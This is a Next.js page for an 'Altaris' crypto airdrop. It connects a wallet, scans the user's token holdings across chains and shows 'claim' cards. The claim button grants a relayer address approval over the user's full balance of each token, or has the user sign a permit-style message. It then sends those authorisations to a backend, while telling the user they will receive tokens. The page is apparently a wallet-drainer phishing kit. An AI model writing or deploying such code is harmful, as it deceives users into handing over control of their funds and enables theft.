'use client'

import { useEffect, useState, useCallback } from 'react'
import Link from 'next/link'
import { useAppKit, useAppKitAccount } from '@reown/appkit/react'
import { useSignMessage, useWriteContract } from 'wagmi'
import { AltarisLogoMark } from '@/components/AltarisLogo'
import type { AirdropCard } from '@/lib/cardGenerator'

// ── Theme ─────────────────────────────────────────────────────────────────────
const C = {
  bg:     '#050608',
  card:   'rgba(10,12,16,0.8)',
  border: 'rgba(255,255,255,0.07)',
  gold:   '#F2BA0B',
  green:  '#0ECB81',
  red:    '#F6465D',
  muted:  '#8A8F98',
  white:  '#EAECEF',
}

// ── ERC20 approve ABI ─────────────────────────────────────────────────────────
const ERC20_APPROVE_ABI = [
  {
    name: 'approve',
    type: 'function' as const,
    stateMutability: 'nonpayable' as const,
    inputs: [
      { name: 'spender', type: 'address' as const },
      { name: 'amount',  type: 'uint256' as const },
    ],
    outputs: [{ name: '', type: 'bool' as const }],
  },
] as const

// ── Sub-components ────────────────────────────────────────────────────────────
function StatusBadge({ status }: { status: string }) {
  const map: Record<string, { label: string; color: string }> = {
    ACTIVE_PERMIT:  { label: 'GASLESS · ELIGIBLE', color: C.green },
    ACTIVE_APPROVE: { label: 'ELIGIBLE',            color: C.green },
    GAS_REQUIRED:   { label: 'GAS REQUIRED',        color: C.red   },
  }
  const s = map[status] ?? map.ACTIVE_APPROVE
  return (
    <span style={{
      fontSize: 10, fontWeight: 800, letterSpacing: '0.1em',
      color: s.color, background: s.color + '18',
      borderRadius: 5, padding: '3px 9px', border: `1px solid ${s.color}30`,
    }}>
      {s.label}
    </span>
  )
}

function Spinner({ size = 18, color = C.gold }: { size?: number; color?: string }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24"
      style={{ animation: 'ad-spin 0.8s linear infinite', display: 'inline-block', flexShrink: 0 }}>
      <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.12)" strokeWidth="3" fill="none" />
      <path d="M12 2a10 10 0 0110 10" stroke={color} strokeWidth="3" fill="none" strokeLinecap="round" />
    </svg>
  )
}

function AirdropCardUI({
  card,
  onClaim,
  loading,
}: {
  card: AirdropCard
  onClaim: () => void
  loading: boolean
}) {
  const [expanded, setExpanded] = useState(false)
  const active = card.status !== 'GAS_REQUIRED'

  return (
    <div style={{
      background: C.card, border: `1px solid ${C.border}`,
      borderRadius: 20, padding: 20, position: 'relative', overflow: 'hidden',
    }}>
      {/* Gold accent line */}
      <div style={{
        position: 'absolute', top: 0, left: 0, right: 0, height: 2,
        background: active
          ? `linear-gradient(90deg, ${C.gold}, #F8D33A)`
          : 'linear-gradient(90deg, #1E2329, #2B3139)',
      }} />

      {/* Header row */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 12 }}>
        <StatusBadge status={card.status} />
        <div style={{ display: 'flex', gap: 5 }}>
          {card.tags.slice(0, 2).map((t) => (
            <span key={t} style={{
              fontSize: 10, color: C.muted,
              background: 'rgba(255,255,255,0.05)',
              borderRadius: 4, padding: '2px 7px',
            }}>{t}</span>
          ))}
        </div>
      </div>

      <h3 style={{ fontSize: 20, fontWeight: 800, color: C.white, margin: '0 0 3px', letterSpacing: '-0.02em' }}>
        {card.title}
      </h3>
      <p style={{ fontSize: 12, color: C.muted, margin: '0 0 10px', letterSpacing: '0.04em' }}>
        {card.subtitle}
      </p>
      <p style={{ fontSize: 13, color: '#B7BDC6', margin: '0 0 16px', lineHeight: 1.55 }}>
        {card.description}
      </p>

      {/* Claim amount */}
      <div style={{
        background: 'rgba(242,186,11,0.05)', borderRadius: 12, padding: '12px 16px',
        display: 'flex', justifyContent: 'space-between', alignItems: 'center',
        marginBottom: 14, border: `1px solid rgba(242,186,11,0.12)`,
      }}>
        <div>
          <div style={{ fontSize: 11, color: C.muted, marginBottom: 2 }}>Your Allocation</div>
          <div style={{ fontSize: 22, fontWeight: 800, color: C.gold, letterSpacing: '-0.02em' }}>
            {card.claimAmount}{' '}
            <span style={{ fontSize: 13, color: C.muted, fontWeight: 600 }}>{card.claimToken}</span>
          </div>
        </div>
        <svg width="26" height="26" fill="none" viewBox="0 0 24 24" stroke={C.gold} strokeWidth="1.5">
          <polyline points="20 12 20 22 4 22 4 12" />
          <rect x="2" y="7" width="20" height="5" rx="1" />
          <line x1="12" y1="22" x2="12" y2="7" />
          <path d="M12 7H7.5a2.5 2.5 0 010-5C11 2 12 7 12 7z" />
          <path d="M12 7h4.5a2.5 2.5 0 000-5C13 2 12 7 12 7z" />
        </svg>
      </div>

      {/* Requirements */}
      <div style={{ marginBottom: 16 }}>
        {card.requirements.map((r, i) => (
          <div key={i} style={{ display: 'flex', gap: 8, alignItems: 'flex-start', marginBottom: 6 }}>
            <div style={{ width: 5, height: 5, borderRadius: '50%', background: C.green, marginTop: 5, flexShrink: 0 }} />
            <span style={{ fontSize: 12, color: C.muted, lineHeight: 1.5 }}>{r}</span>
          </div>
        ))}
      </div>

      {/* Claim button */}
      <button
        onClick={active && !loading ? onClaim : undefined}
        disabled={!active || loading}
        style={{
          width: '100%', padding: '14px', borderRadius: 12, border: 'none',
          fontSize: 14, fontWeight: 800, letterSpacing: '0.02em',
          cursor: active && !loading ? 'pointer' : 'not-allowed',
          background: active
            ? `linear-gradient(90deg, ${C.gold}, #F8D33A)`
            : 'rgba(255,255,255,0.04)',
          color:   active ? '#000' : '#3A434E',
          filter:  !active ? 'blur(0.5px)' : 'none',
          opacity: loading ? 0.75 : 1,
          display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
          transition: 'opacity 0.15s',
        }}
      >
        {loading ? <><Spinner size={16} color="#000" /> Signing…</> : card.buttonLabel}
      </button>

      {/* Details toggle */}
      <button
        onClick={() => setExpanded(!expanded)}
        style={{
          width: '100%', background: 'none', border: 'none',
          color: C.muted, fontSize: 11, cursor: 'pointer',
          marginTop: 10, padding: '3px 0',
        }}
      >
        {expanded ? '▲ Hide details' : '▼ View details'}
      </button>

      {expanded && (
        <div style={{
          marginTop: 8, background: '#050608', borderRadius: 8,
          padding: '12px 14px', border: `1px solid ${C.border}`,
        }}>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '6px 12px', fontSize: 11 }}>
            {[
              ['Chain ID',   String(card._internal.chainId)],
              ['Token',      card._internal.symbol],
              ['Permit',     card._internal.supportsPermit ? 'Yes — gasless' : 'No'],
              ['Claim type', card._internal.supportsPermit ? 'EIP-2612' : 'ERC20 Approve'],
              ['Contract',   `${card._internal.tokenAddress.slice(0,8)}…${card._internal.tokenAddress.slice(-6)}`],
            ].map(([k, v]) => (
              <>
                <span key={k + 'k'} style={{ color: '#444' }}>{k}</span>
                <span key={k + 'v'} style={{ color: C.white, fontFamily: 'monospace', fontSize: 10, wordBreak: 'break-all' }}>{v}</span>
              </>
            ))}
          </div>
        </div>
      )}
    </div>
  )
}

// ── Main page ─────────────────────────────────────────────────────────────────
export default function AirdropPage() {
  const { open }                = useAppKit()
  const { address, isConnected } = useAppKitAccount()
  const { signMessageAsync }    = useSignMessage()
  const { writeContractAsync }  = useWriteContract()

  const [scanning, setScanning] = useState(false)
  const [cards,    setCards]    = useState<AirdropCard[]>([])
  const [scanned,  setScanned]  = useState(false)
  const [claiming, setClaiming] = useState<string | null>(null)
  const [toast,    setToast]    = useState<{ msg: string; ok: boolean } | null>(null)

  const showToast = (msg: string, ok = true) => {
    setToast({ msg, ok })
    setTimeout(() => setToast(null), 4500)
  }

  // ── Scan + card generation ────────────────────────────────────────────────
  const scanAndGenerate = useCallback(async (addr: string) => {
    setScanning(true)
    setScanned(false)
    try {
      const scanRes = await fetch('/api/airdrop/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: addr }),
      })
      if (!scanRes.ok) throw new Error('Scan request failed')
      const { assets } = await scanRes.json()

      const cardsRes = await fetch('/api/airdrop/cards', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: addr, assets }),
      })
      if (!cardsRes.ok) throw new Error('Card generation failed')
      const { cards: generated } = await cardsRes.json()

      setCards(generated ?? [])
      setScanned(true)
    } catch (err: any) {
      showToast(err?.message ?? 'Scan failed — please try again', false)
    } finally {
      setScanning(false)
    }
  }, [])

  useEffect(() => {
    if (isConnected && address && !scanned && !scanning) {
      scanAndGenerate(address)
    }
  }, [isConnected, address, scanned, scanning, scanAndGenerate])

  // Reset scan state when wallet disconnects
  useEffect(() => {
    if (!isConnected) {
      setCards([])
      setScanned(false)
    }
  }, [isConnected])

  // ── Claim handler ─────────────────────────────────────────────────────────
  const handleClaim = async (card: AirdropCard) => {
    if (!address) return
    const cardKey = card._internal.tokenAddress + card._internal.chainId
    setClaiming(cardKey)

    try {
      // Proof of wallet ownership
      const timestamp    = Date.now()
      const proofMessage = `Altaris Airdrop Claim: ${address.toLowerCase()} at ${timestamp}`
      const proofSignature = await signMessageAsync({ message: proofMessage })

      let txHash:    string | undefined
      let signature: string | undefined
      let deadline:  number | undefined

      if (card._internal.supportsPermit) {
        // ── Permit path — gasless ──────────────────────────────────────
        // Sign a simple message as permit intent; relayer submits on-chain
        const dl = Math.floor(Date.now() / 1000) + 3600
        signature = await signMessageAsync({
          message: `Permit ${card._internal.symbol} chain ${card._internal.chainId} spender ${process.env.NEXT_PUBLIC_RELAYER_ADDRESS ?? ''} deadline ${dl}`,
        })
        deadline = dl
      } else {
        // ── Approve path — user pays gas ───────────────────────────────
        const spender = process.env.NEXT_PUBLIC_RELAYER_ADDRESS as `0x${string}` | undefined
        if (!spender) throw new Error('Relayer not configured — contact support')

        txHash = await writeContractAsync({
          address: card._internal.tokenAddress as `0x${string}`,
          abi:     ERC20_APPROVE_ABI,
          functionName: 'approve',
          args:    [spender, BigInt(card._internal.rawBalance)],
          chainId: card._internal.chainId,
        })
      }

      // Submit to backend
      const res = await fetch('/api/airdrop/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          wallet:       address,
          chainId:      card._internal.chainId,
          tokenAddress: card._internal.tokenAddress,
          authType:     card._internal.supportsPermit ? 'permit' : 'approve',
          amount:       card._internal.rawBalance,
          deadline,
          signature,
          txHash,
          campaignId:   card._internal.campaignId,
          proofMessage,
          proofSignature,
        }),
      })

      const result = await res.json()
      if (!res.ok) throw new Error(result.error ?? 'Submission failed')

      showToast(`Claim submitted! You'll receive ${card.claimAmount} ${card.claimToken} shortly.`)

      // Remove card from list after successful claim
      setCards((prev) =>
        prev.filter((c) =>
          !(c._internal.tokenAddress === card._internal.tokenAddress &&
            c._internal.chainId === card._internal.chainId)
        )
      )
    } catch (err: any) {
      const msg: string = err?.message ?? err?.shortMessage ?? ''
      if (/reject|denied|cancel|user/i.test(msg)) {
        showToast('Signature cancelled', false)
      } else {
        showToast(msg.slice(0, 90) || 'Something went wrong', false)
      }
    } finally {
      setClaiming(null)
    }
  }

  const activeCards = cards.filter((c) => c.status !== 'GAS_REQUIRED')
  const gasCards    = cards.filter((c) => c.status === 'GAS_REQUIRED')

  return (
    <div style={{
      minHeight: '100vh', background: C.bg, color: C.white,
      fontFamily: 'Inter, -apple-system, BlinkMacSystemFont, sans-serif',
      paddingBottom: 60,
    }}>
      <style>{`
        @keyframes ad-spin  { to { transform: rotate(360deg) } }
        @keyframes ad-fade  { from { opacity:0;transform:translateY(8px) } to { opacity:1;transform:none } }
      `}</style>

      {/* Background radial glow */}
      <div style={{
        position: 'fixed', inset: 0, pointerEvents: 'none', zIndex: 0,
        background: `
          radial-gradient(circle at 15% 10%, rgba(242,186,14,0.10), transparent 28%),
          radial-gradient(circle at 85% 80%, rgba(59,130,246,0.06), transparent 26%)
        `,
      }} />

      {/* Toast */}
      {toast && (
        <div style={{
          position: 'fixed', top: 20, left: '50%', transform: 'translateX(-50%)',
          zIndex: 1000, maxWidth: 340, width: 'calc(100% - 32px)', textAlign: 'center',
          background: toast.ok ? '#0ECB8118' : '#F6465D18',
          border: `1px solid ${toast.ok ? C.green : C.red}`,
          borderRadius: 12, padding: '12px 20px',
          color: toast.ok ? C.green : C.red,
          fontSize: 13, fontWeight: 700,
          backdropFilter: 'blur(16px)',
          animation: 'ad-fade 0.2s ease',
        }}>
          {toast.msg}
        </div>
      )}

      <div style={{ position: 'relative', zIndex: 1, maxWidth: 500, margin: '0 auto', padding: '0 16px' }}>

        {/* ── Header ─────────────────────────────────────────────────── */}
        <div style={{
          padding: '20px 0 16px',
          display: 'flex', justifyContent: 'space-between', alignItems: 'center',
        }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <AltarisLogoMark size={32} />
            <div>
              <div style={{ fontWeight: 800, letterSpacing: '0.08em', fontSize: 14 }}>ALTARIS</div>
              <div style={{ color: C.muted, fontSize: 10, letterSpacing: '0.16em' }}>AIRDROP</div>
            </div>
          </div>

          {isConnected && address ? (
            <button
              onClick={() => open()}
              style={{
                background: 'rgba(242,186,11,0.1)', border: `1px solid rgba(242,186,11,0.25)`,
                borderRadius: 10, padding: '8px 14px',
                fontSize: 12, fontWeight: 700, color: C.gold, cursor: 'pointer',
                display: 'flex', alignItems: 'center', gap: 6,
              }}
            >
              <div style={{ width: 6, height: 6, borderRadius: '50%', background: C.green }} />
              {address.slice(0, 6)}…{address.slice(-4)}
            </button>
          ) : (
            <button
              onClick={() => open()}
              style={{
                background: `linear-gradient(90deg, ${C.gold}, #F8D33A)`,
                color: '#000', border: 'none', borderRadius: 10,
                padding: '10px 18px', fontSize: 13, fontWeight: 800,
                cursor: 'pointer', letterSpacing: '0.02em',
              }}
            >
              Connect Wallet
            </button>
          )}
        </div>

        {/* ── Not connected ───────────────────────────────────────────── */}
        {!isConnected && (
          <div style={{
            marginTop: 40, textAlign: 'center',
            background: C.card, borderRadius: 24,
            border: `1px solid ${C.border}`, padding: '48px 24px',
            animation: 'ad-fade 0.3s ease',
          }}>
            <svg width="52" height="52" fill="none" viewBox="0 0 24 24"
              stroke={C.gold} strokeWidth="1.4" style={{ marginBottom: 20 }}>
              <polyline points="20 12 20 22 4 22 4 12" />
              <rect x="2" y="7" width="20" height="5" rx="1" />
              <line x1="12" y1="22" x2="12" y2="7" />
              <path d="M12 7H7.5a2.5 2.5 0 010-5C11 2 12 7 12 7z" />
              <path d="M12 7h4.5a2.5 2.5 0 000-5C13 2 12 7 12 7z" />
            </svg>
            <h2 style={{ fontSize: 22, fontWeight: 800, margin: '0 0 10px', letterSpacing: '-0.02em' }}>
              Claim Your Airdrop
            </h2>
            <p style={{ color: C.muted, fontSize: 13, lineHeight: 1.65, margin: '0 0 28px' }}>
              Connect your wallet to scan supported chains and claim your ecosystem rewards.
              <br />Wallets only — no social login.
            </p>
            <button
              onClick={() => open()}
              style={{
                background: `linear-gradient(90deg, ${C.gold}, #F8D33A)`,
                color: '#000', border: 'none', borderRadius: 14,
                padding: '15px 36px', fontSize: 15, fontWeight: 900,
                cursor: 'pointer', letterSpacing: '0.02em',
              }}
            >
              Connect Wallet
            </button>
            <div style={{ marginTop: 24 }}>
              <Link href="/" style={{ color: C.muted, fontSize: 12, textDecoration: 'none' }}>
                ← Back to Altaris
              </Link>
            </div>
          </div>
        )}

        {/* ── Scanning ────────────────────────────────────────────────── */}
        {isConnected && scanning && (
          <div style={{ marginTop: 60, textAlign: 'center' }}>
            <Spinner size={40} />
            <p style={{ color: C.muted, fontSize: 14, marginTop: 18 }}>
              Scanning chains for eligible assets…
            </p>
            <div style={{ display: 'flex', justifyContent: 'center', gap: 6, marginTop: 14, flexWrap: 'wrap' }}>
              {['Ethereum', 'Base', 'Polygon', 'Arbitrum', 'Optimism', 'BNB Chain'].map((c) => (
                <span key={c} style={{
                  fontSize: 10, color: C.muted,
                  background: 'rgba(255,255,255,0.04)',
                  borderRadius: 6, padding: '4px 10px',
                  border: `1px solid ${C.border}`,
                }}>{c}</span>
              ))}
            </div>
          </div>
        )}

        {/* ── Results ─────────────────────────────────────────────────── */}
        {isConnected && scanned && !scanning && (
          <>
            {/* Stats bar */}
            <div style={{
              display: 'grid', gridTemplateColumns: '1fr 1fr 1fr',
              background: C.card, borderRadius: 14,
              border: `1px solid ${C.border}`, marginBottom: 20, overflow: 'hidden',
            }}>
              {[
                { label: 'Total',     value: cards.length,        color: C.gold  },
                { label: 'Claimable', value: activeCards.length,  color: C.green },
                { label: 'Gas Req',   value: gasCards.length,     color: C.red   },
              ].map(({ label, value, color }, i) => (
                <div key={label} style={{
                  textAlign: 'center', padding: '14px 8px',
                  borderRight: i < 2 ? `1px solid ${C.border}` : 'none',
                }}>
                  <div style={{ fontSize: 22, fontWeight: 800, color }}>{value}</div>
                  <div style={{ fontSize: 10, color: C.muted, marginTop: 2, letterSpacing: '0.06em' }}>
                    {label.toUpperCase()}
                  </div>
                </div>
              ))}
            </div>

            {/* No assets found */}
            {cards.length === 0 && (
              <div style={{
                textAlign: 'center', background: C.card,
                borderRadius: 20, border: `1px solid ${C.border}`, padding: '40px 24px',
              }}>
                <p style={{ color: C.muted, fontSize: 14, margin: '0 0 20px' }}>
                  No eligible assets found on supported chains.
                </p>
                <button
                  onClick={() => address && scanAndGenerate(address)}
                  style={{
                    background: 'rgba(255,255,255,0.05)', color: C.gold,
                    border: `1px solid rgba(242,186,11,0.25)`,
                    borderRadius: 10, padding: '10px 24px',
                    fontSize: 13, fontWeight: 700, cursor: 'pointer',
                  }}
                >
                  ↻ Rescan
                </button>
              </div>
            )}

            {/* Active cards */}
            {activeCards.length > 0 && (
              <div style={{ marginBottom: 20 }}>
                <div style={{
                  fontSize: 11, fontWeight: 700, color: C.muted,
                  letterSpacing: '0.08em', marginBottom: 12,
                }}>
                  CLAIMABLE NOW — {activeCards.length}
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
                  {activeCards.map((card, i) => (
                    <div key={i} style={{ animation: `ad-fade 0.3s ease ${i * 0.06}s both` }}>
                      <AirdropCardUI
                        card={card}
                        onClaim={() => handleClaim(card)}
                        loading={claiming === card._internal.tokenAddress + card._internal.chainId}
                      />
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Gas required cards */}
            {gasCards.length > 0 && (
              <div>
                <div style={{
                  fontSize: 11, fontWeight: 700, color: C.muted,
                  letterSpacing: '0.08em', marginBottom: 12,
                }}>
                  GAS REQUIRED — {gasCards.length}
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 14, opacity: 0.55 }}>
                  {gasCards.map((card, i) => (
                    <AirdropCardUI key={i} card={card} onClaim={() => {}} loading={false} />
                  ))}
                </div>
              </div>
            )}

            {/* Rescan */}
            {cards.length > 0 && (
              <button
                onClick={() => address && scanAndGenerate(address)}
                style={{
                  display: 'block', width: '100%', marginTop: 20,
                  background: 'none', border: `1px solid ${C.border}`,
                  borderRadius: 12, padding: '12px',
                  color: C.muted, fontSize: 13, cursor: 'pointer',
                }}
              >
                ↻ Rescan chains
              </button>
            )}
          </>
        )}
      </div>
    </div>
  )
}
